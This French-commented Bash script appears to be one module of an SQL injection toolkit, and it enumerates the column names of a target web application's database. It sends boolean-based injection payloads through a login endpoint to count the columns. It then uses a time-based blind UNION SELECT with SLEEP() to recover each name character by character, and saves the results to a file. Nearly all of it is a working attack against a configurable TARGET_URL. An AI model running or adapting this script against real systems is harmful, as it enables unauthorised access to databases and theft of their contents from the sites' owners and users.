#!/bin/bash

# Chargement des configurations globales
source "$(dirname "${BASH_SOURCE[0]}")/../config/globals.sh"

# Stockage des résultats
declare -A FOUND_COLUMNS

# Fonction pour l'extraction des colonnes
extract_columns() {
    sql_log "INFO" "Démarrage de l'extraction des colonnes"
    local count=0
    
    # Phase 1: Détection du nombre de colonnes
    sql_log "QUERY" "Détection du nombre de colonnes"
    for val in $(seq 1 $MAX_ATTEMPTS); do
        loading_animation "Test avec COUNT = $val"
        
        local payload="' OR (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='$db' AND TABLE_NAME='$table')=${val};-- -"
        local response=$(send_request "$payload")
        local message=$(echo "$response" | jq -r '.message // empty')
        
        if [[ "$message" == *"Authentification réussie"* ]]; then
            count=$val
            sql_log "INFO" "Nombre de colonnes détecté : $count"
            break
        fi
        sleep $REQUEST_DELAY
    done

    if [[ $count -eq 0 ]]; then
        sql_log "ERROR" "Impossible de déterminer le nombre de colonnes"
        return 1
    fi

    # Phase 2: Extraction des noms
    for offset in $(seq 0 $((count - 1))); do
        sql_log "QUERY" "Extraction de la colonne $((offset + 1))/$count"
        local column_name=""

        for position in $(seq 1 $MAX_LENGTH); do
            local found=false

            for char in $(echo -n "$CHARSET" | sed 's/\(.\)/\1 /g'); do
                loading_animation "Test position $position avec '$char'"
                
                local injection="' UNION SELECT CASE WHEN (SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='$db'AND TABLE_NAME='$table' LIMIT 1 OFFSET ${offset}), ${position}, 1) = '${char}') THEN SLEEP(${THRESHOLD}) ELSE NULL END, NULL, NULL-- -"
                local duration=$(test_injection "$injection")

                if (( $(echo "$duration > $THRESHOLD" | bc -l) )); then
                    column_name+="$char"
                    sql_log "INFO" "Caractère trouvé: $char"
                    found=true
                    break
                fi
            done

            if [ "$found" = false ]; then
                break
            fi
            sleep $REQUEST_DELAY
        done

        if [ -n "$column_name" ]; then
            FOUND_COLUMNS[$offset]=$column_name
            sql_log "INFO" "Colonne $((offset + 1)) : $column_name"
        fi
    done

    # Sauvegarde des résultats
    save_columns_results
    
    # Affichage du résumé
    display_columns_summary
}

# Fonction pour sauvegarder les résultats
save_columns_results() {
    local result_file="column_$(date '+%Y%m%d_%H%M%S').txt"
    {
        echo "Résultats de l'extraction des colonnes - $(date '+%Y-%m-%d %H:%M:%S')"
        echo "URL cible: $TARGET_URL"
        echo "----------------------------------------"
        echo "ID | Nom de la colonne"
        echo "----------------------------------------"
        for i in "${!FOUND_COLUMNS[@]}"; do
            echo "$((i + 1)) | ${FOUND_COLUMNS[$i]}"
        done
        echo "----------------------------------------"
        echo "Total: ${#FOUND_COLUMNS[@]} colonnes trouvées"
    } > "$result_file"

    sql_log "INFO" "Résultats sauvegardés dans $result_file"
}

# Fonction pour afficher le résumé
display_columns_summary() {
    echo -e "\n${BLUE}"
    echo "╔═══════════════════════════ TABLES═══════════ ═══════════════════════════╗"
    echo "║                                                                         ║"
    printf "║  %-3s │ %-55s ║\n" "ID" "Nom de la colonne"
    echo "║═════╪═════════════════════════════════════════════════════════════════║"
    
    for i in "${!FOUND_COLUMNS[@]}"; do
        printf "║  %-3d │ %-55s ║\n" "$((i + 1))" "${FOUND_COLUMNS[$i]}"
    done
    
    echo "║                                                                         ║"
    printf "║  Total: %-3d colonnes trouvées                                             ║\n" "${#FOUND_COLUMNS[@]}"
    echo "╚═════════════════════════════════════════════════════════════════════════╝"
    echo -e "${DEFAULT}"
}

# Si le script est exécuté directement
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    # Vérification que la configuration est chargée
    if [[ -z "$TARGET_URL" ]]; then
        echo "Erreur: Configuration non chargée"
        exit 1
    fi
    
    extract_columns
fi
